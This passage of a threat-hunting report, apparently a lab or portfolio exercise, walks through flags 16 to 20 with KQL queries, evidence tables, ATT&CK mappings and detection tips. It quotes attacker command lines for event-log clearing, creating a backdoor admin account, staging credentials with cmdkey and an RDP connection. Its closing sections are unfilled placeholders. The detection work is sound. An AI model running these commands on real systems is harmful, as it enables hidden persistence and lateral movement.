| where InitiatingProcessAccountName == "kenji.sato"
| where FileName contains "wevtutil"
| project TimeGenerated, DeviceName, ActionType, FileName, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="926" height="107" alt="Screenshot 2026-02-14 at 1 55 48 PM" src="https://github.com/user-attachments/assets/f490caed-6fb7-4619-8c1e-48983cb8de26" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for FileName == "wevtutil.exe" combined with ProcessCommandLine contains "cl". Clearing logs outside of approved change windows is a high-confidence indicator of malicious activity.

</details>

---

<details>
<summary id="-flag-17">🚩 <strong>Flag 17: IMPACT - Persistence Account<Technique Name></strong></summary>

### 🎯 Objective
Establish long-term alternative access by creating a hidden or secondary local administrator account.

### 📌 Finding
The attacker created a new local account named: **support** using the following command: **net.exe user support ********** /add**. This account was subsequently added to the local Administrators group to maintain privileged access.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:09:48.8977132Z |
| Process | net.exe |
| Command Line | net.exe user support ********** /add |
| Account Used | kenji.sato |

### 💡 Why it matters

Creating a backdoor administrator account ensures:

- Persistent access even if the original compromised account is reset  
- Ability to re-enter the system at a later time  
- Administrative privileges independent of the original user  

This represents a clear impact phase action and deliberate long-term persistence mechanism.

This maps to MITRE ATT&CK:

T1136.001 – Create Account: Local Account

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| where ProcessCommandLine contains "user"
   or ProcessCommandLine contains "/add"
| project TimeGenerated, DeviceName, ActionType, InitiatingProcessCommandLine, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1077" height="202" alt="Screenshot 2026-02-14 at 1 59 26 PM" src="https://github.com/user-attachments/assets/6ba25242-6a9d-47c2-bcc4-f48c6dbc6cde" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for ProcessCommandLine contains "net.exe user" combined with /add. Immediately verify whether the created account was added to the Administrators group for privilege escalation.

</details>

---

<details>
<summary id="-flag-18">🚩 <strong>Flag 18: EXECUTION - Malicious Script<Technique Name></strong></summary>

### 🎯 Objective
Automate the attack chain using a PowerShell script to streamline execution of reconnaissance, staging, persistence, and exfiltration steps.

### 📌 Finding
A PowerShell script named: **wupdate.ps1** was executed during the initial compromise phase. The script name mimics legitimate Windows Update activity to avoid suspicion.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:08:07.2365171Z |
| Process | powershell.exe |
| Script Name | wupdate.ps1 |
| Account | kenji.sato |

### 💡 Why it matters

PowerShell is frequently used by attackers because it:

- Is natively installed on Windows systems  
- Allows execution of complex attack logic  
- Can download payloads, modify registry keys, and create persistence  
- Blends into administrative activity  

The script name `wupdate.ps1` was chosen to appear legitimate and avoid drawing attention.

This maps to MITRE ATT&CK:

T1059.001 – Command and Scripting Interpreter: PowerShell

### 🔧 KQL Query Used
```
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| project TimeGenerated, DeviceName, FileName ,InitiatingProcessCommandLine
```

### 🖼️ Screenshot
<img width="1107" height="301" alt="Screenshot 2026-02-14 at 2 05 02 PM" src="https://github.com/user-attachments/assets/b22839c4-8da6-4b3d-b4eb-d0c79da5e3d3" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for powershell.exe combined with .ps1 in ProcessCommandLine. Scripts with names mimicking system processes (e.g., update, patch, security) warrant deeper investigation.

</details>

---

<details>
<summary id="-flag-19">🚩 <strong>Flag 19: LATERAL MOVEMENT - Secondary Target<Technique Name></strong></summary>

### 🎯 Objective
Leverage harvested credentials to move laterally to another internal system within the network.

### 📌 Finding
The attacker targeted the internal IP address: **10.1.0.188**. Credentials were staged using: **cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:**********/** indicating preparation for authenticated remote access to that host.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:10:37.2625077Z |
| Process | cmdkey.exe |
| Command Line | cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:********** |
| Target IP | 10.1.0.188 |
| Account Used | kenji.sato |

### 💡 Why it matters

`cmdkey.exe` is a legitimate Windows utility used to store credentials for remote authentication. By storing credentials for **10.1.0.188**, the attacker prepared for lateral movement using previously dumped credentials.

This demonstrates:

- Successful credential harvesting  
- Internal reconnaissance  
- Attempted expansion of compromise  

This maps to MITRE ATT&CK:

T1550 – Use Alternate Authentication Material  
T1021.001 – Remote Services (RDP)


### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| where ProcessCommandLine contains "10.1.0.188"
| project TimeGenerated, DeviceName, ActionType, FileName, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1080" height="77" alt="Screenshot 2026-02-14 at 2 10 17 PM" src="https://github.com/user-attachments/assets/eb753af5-869b-4c1d-b083-2a8bf520f75a" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for cmdkey.exe combined with internal IP addresses. When observed shortly after credential dumping, it strongly indicates lateral movement preparation.

</details>

---

<details>
<summary id="-flag-20">🚩 <strong>Flag 20: LATERAL MOVEMENT - Remote Access Tool<Technique Name></strong></summary>

### 🎯 Objective
Use a built-in Windows remote access utility to establish an authenticated session to a secondary internal system.

### 📌 Finding
The attacker used the Windows Remote Desktop client: **mstsc.exe** to connect to the internal host: **10.1.0.188**. Command observed: **mstsc.exe /v:10.1.0.188**. This occurred shortly after credentials were staged using `cmdkey.exe`.


### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-sl |
| Timestamp | 2025-11-19T19:10:41.372526Z |
| Process | mstsc.exe |
| Command Line | mstsc.exe /v:10.1.0.188 |
| Target IP | 10.1.0.188 |
| Account Used | kenji.sato |

### 💡 Why it matters

`mstsc.exe` is the legitimate Microsoft Terminal Services Client used for RDP connections. Its use demonstrates:

- Successful preparation of credentials  
- Attempted authenticated lateral movement  
- Expansion of attacker foothold inside the network  

Because it is a native Windows binary, it blends in with legitimate administrative activity, making detection more difficult without contextual correlation.

This maps to MITRE ATT&CK:

T1021.001 – Remote Services: Remote Desktop Protocol

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-19 19:07:00) .. datetime(2025-11-19 20:00:00))
| where DeviceName == "azuki-sl"
| where InitiatingProcessAccountName == "kenji.sato"
| where ProcessCommandLine contains "10.1.0.188"
| project TimeGenerated, DeviceName, ActionType, FileName, ProcessCommandLine
```

### 🖼️ Screenshot
<img width="1080" height="77" alt="Screenshot 2026-02-14 at 2 10 17 PM" src="https://github.com/user-attachments/assets/896af871-f94a-49f0-a25f-44080274dee3" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Search DeviceProcessEvents for mstsc.exe combined with /v: arguments. When preceded by cmdkey.exe execution, this sequence strongly indicates credential-based lateral movement.

</details>


---


## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
